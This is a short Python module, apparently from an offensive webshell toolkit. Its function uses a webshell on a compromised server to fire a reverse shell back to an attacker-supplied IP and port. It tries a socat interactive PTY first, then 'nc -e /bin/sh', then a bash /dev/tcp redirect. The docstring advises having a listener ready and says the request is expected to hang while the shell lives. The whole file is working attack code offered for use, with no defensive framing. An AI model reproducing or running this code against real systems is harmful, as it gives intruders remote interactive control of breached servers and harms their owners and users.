"""Reverse shells, trying socat (interactive PTY), then nc, then bash."""

from __future__ import annotations

import shlex

from .. import log
from ..core.webshell import WebShell
from ..exceptions import ConnectionFailed, WebshellError


def _which(ws: WebShell, binary: str) -> str:
    try:
        return ws.run_command(f"which {shlex.quote(binary)}").strip()
    except WebshellError:
        return ""


def reverse_shell(ws: WebShell, ip: str, port: int) -> None:
    """Fire a reverse shell back to ``ip:port``.

    The HTTP request blocks for as long as the shell lives, so a timeout here
    is the *expected* success path (v1 relied on the same trick) — have your
    listener (``socat file:\\`tty\\`,raw,echo=0 tcp-l:PORT`` or ``nc -lvnp``)
    ready first.
    """
    ip_q, port_q = shlex.quote(ip), str(int(port))

    socat = _which(ws, "socat")
    if socat:
        log.success(f"socat found ({socat}); spawning interactive reverse shell.")
        cmd = f"{socat} tcp-connect:{ip_q}:{port_q} exec:'bash -li',pty,stderr,setsid,sigint,sane"
    else:
        nc = _which(ws, "nc")
        if nc:
            log.success(f"nc found ({nc}); spawning reverse shell.")
            cmd = f"{nc} -e /bin/sh {ip_q} {port_q}"
        else:
            log.warning("Neither socat nor nc found; falling back to bash /dev/tcp.")
            cmd = f"bash -c 'sh -i >& /dev/tcp/{ip}/{port_q} 0>&1'"

    try:
        ws.run_command(cmd)
    except ConnectionFailed:
        # Connection dropped/timed out == the shell took over the request.
        log.success("Connection closed by the reverse shell (this is expected).")
